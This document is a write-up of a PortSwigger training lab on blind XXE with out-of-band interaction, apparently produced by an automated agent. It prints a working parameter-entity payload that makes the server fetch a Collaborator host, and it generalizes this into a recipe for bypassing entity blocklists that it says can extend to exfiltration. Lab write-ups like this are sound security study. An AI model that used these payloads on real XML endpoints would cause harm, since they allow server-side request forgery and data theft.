# PortSwigger Lab

## Lab

Blind XXE with out-of-band interaction via XML parameter entities

URL: https://0ade003b04efeb708078ad50005b008e.web-security-academy.net/

## Vulnerability Class

XXE injection, blind OOB via XML parameter entities – general entities blocked (`Entities are not allowed`), external parameter entity (`% xxe;` in DTD) still fetched server-side → Collaborator interaction → solved by attribution

## Objective

Trigger server-side outbound interaction to Collaborator via parameter-entity XXE (detection lab – solved by attribution). Established by `is-solved` flip after corrected-syntax attempt + wait. Official description not fetched; parameter-entity form from XXE knowledge, validated by errors + marker.

## Initial Observations

- Shop + XML stock-check (`POST /product/stock`) – same sink shape as 3 prior XXE labs (current evidence from product page).
- Baseline (`productId=1,storeId=1`) → 200 `110` (count oracle).
- Regular general entity (`<!ENTITY xxe SYSTEM "http://...">` + `&xxe;` in body) → `400 "Entities are not allowed for security reasons"` – general-entity REFERENCES blocked (new control vs prior labs; body must stay clean).
- Stored `methodology/xxe.md` (in-band file, SSRF-drill, blind OOB with general entities; no parameter-entity section) + blind-OOB discipline (unique subdomain, 60-90s wait, marker check, trigger-response non-oracle).

## Hypotheses

- H1: Block targets general-entity references in body; parameter entities in DTD (`<!ENTITY % xxe SYSTEM ...>` + `%xxe;`) are still resolved (fetch during DTD parse). Evidence needed: `XML parsing error` (fetch attempted) vs `Entities are not allowed` (blocked).
- H2: Parameter-entity reference syntax is `%xxe;` (NO space after `%`); `% xxe;` is malformed and never fetches. Evidence needed: spaced form unsolved after full wait vs unspaced solved.
- H3: Marker after async wait arbitrates (trigger `XML parsing error` is non-oracle, as in prior blind-OOB lab).

## Attempts

1. Baseline product page + baseline POST (`110`) – sink + shape in 2 requests.
2. General-entity OOB (`http://nc7w152rjiuw...` + `&xxe;`) → `400 Entities are not allowed` – H1's premise confirmed (block is real, body references unusable).
3. Parameter entity with SPACED reference (`% xxe;`, subdomain `bwtxs7hnn0xg`) → `400 XML parsing error` → waited 65s + 60s more → still `is-notsolved` – ambiguous: fetch-or-malformed indistinguishable from outside; correctly treated as inconclusive, not success.
4. Parameter entity with CORRECT reference (`%xxe;`, fresh subdomain `uely0sd53rq3`, clean body `productId=1`) → `400 XML parsing error` → waited 70s → `is-solved`/`Solved`/`Congratulations` – H1+H2+H3 confirmed; spacing was the load-bearing difference.

## What Failed

- General-entity OOB (blocked by message – expected after reading the error, 1 request, correctly abandoned, not retried).
- Spaced `% xxe;` parameter reference (malformed – parser rejected before fetching; ~125s of waiting proved nothing because nothing was sent). Valuable: isolates reference syntax as load-bearing; fresh subdomain on retry preserved attribution hygiene.

## What Worked

- `<!DOCTYPE stockCheck [<!ENTITY % xxe SYSTEM "http://<unique>.burpcollaborator.net"> %xxe;]>` with CLEAN body + correct `%xxe;` + fresh subdomain + 70s wait + marker check. 6 requests + waits.

## Burp Observations

- Baseline, block confirmation, both parameter attempts, proof – all via Burp MCP. Three distinct 400 messages mapped three states (`Entities are not allowed` = blocked reference; `XML parsing error` = DTD-parse path engaged; plus prior labs' generic `Invalid product ID`).

## Browser Observations

- Not required. No JS/state workflow.

## CLI / Tool Observations

- `burp_generate_random_string` (fresh 12-char subdomain PER attempt – including the retry, since the first subdomain's silence was inconclusive, not proof of no-fire); `bash sleep` for async windows. No scanner/crawler/fuzzer.

## Root Cause

Blocklist covers general-entity usage (`&xxe;` in body) but the parser still resolves external PARAMETER entities during DTD processing: `<!ENTITY % xxe SYSTEM "http://...">` referenced as `%xxe;` inside the DOCTYPE triggers a server-side fetch with no output channel. Detection via receiver-side interaction attributed to instance.

## Verification

- Block proof: general-entity form rejected with explicit message (control exists and works as documented).
- Syntax proof: spaced vs unspaced reference under identical conditions (unsolved after 125s vs solved after 70s) – spacing isolated as the single variable across attempts (fresh subdomains keep attribution clean).
- Impact proof: global `is-solved` via fresh anon `GET /` + Burp `GET /` (`is-solved`/`Solved`). Trigger `XML parsing error` in both attempts – correctly excluded from verdict both times.

## Impact

Server-side request forgery via XXE parameter entities (demonstrated outbound interaction; same primitive enables OOB exfiltration via external DTD + parameter-entity exfil chains, and internal probing). Blocklists on `&`-references alone are insufficient – DTD-layer resolution must also be disabled.

## Why The Successful Approach Worked

- Read the block message as a SPECIFICATION (`Entities are not allowed` = general-entity references blocked → parameter entities are the designed bypass, matching the lab title).
- Kept body clean (`productId=1`) so the ONLY entity surface was the DTD layer under test.
- Treated the first parameter attempt's silence as inconclusive (not failure of approach) and varied the ONE suspect variable (reference spacing) with a fresh subdomain – instead of abandoning parameter entities or reusing a potentially-burned subdomain.

## Generalization

- For `Entities are not allowed`-style blocks: switch to `<!ENTITY % name SYSTEM "http://<unique>/">` + `%name;` INSIDE the DOCTYPE with clean body; reference syntax `%name;` has NO space (`% name;` is malformed and silently never fetches – the costliest typo in XXE: long silent waits proving nothing).
- Fresh subdomain per attempt ALWAYS (a silent wait is only meaningful if attribution is unambiguous).
- Three-message mapping for XXE endpoints: explicit-block vs generic vs parse-error – each dictates the next move (bypass form / OOB attempt / syntax fix).

## Lessons Learned

- `%xxe;` vs `% xxe;`: one space = fetch vs no-fetch, indistinguishable from outside except by the marker after a full wait – get the syntax right BEFORE the wait (validate against DTD grammar knowledge, not trial).
- Inconclusive ≠ failed: silent waits on suspect payloads demand a varied retry (one variable), not abandonment of the technique.
- Block messages specify bypasses: `Entities are not allowed` (body references) points directly at DTD-layer parameter entities.

## Related Methodology

- Extends `methodology/xxe.md` (no parameter-entity pattern – update justified below; 4th XXE lab, new bypass + syntax lesson).
- `methodology/injection.md` does NOT apply. Deliberately not modified.
- Priors: `xxe-blind-oob-interaction.md` (blind-OOB discipline + wait/marker/hygiene reused verbatim), all XXE notes (endpoint/entity/slot/length recipe).

## References

- Solved instance: https://0ade003b04efeb708078ad50005b008e.web-security-academy.net/
- Lab: https://portswigger.net/web-security/xxe/blind/lab-xxe-with-out-of-band-interaction-using-parameter-entities
- OOB subdomains (instance-bound): nc7w152rjiuw (general-entity, blocked), bwtxs7hnn0xg (spaced ref, malformed/inconclusive), uely0sd53rq3 (correct ref, solved)
- Deliberately did NOT fetch official solution; parameter-entity form from XXE grammar knowledge, spacing fixed by reasoning + marker evidence.
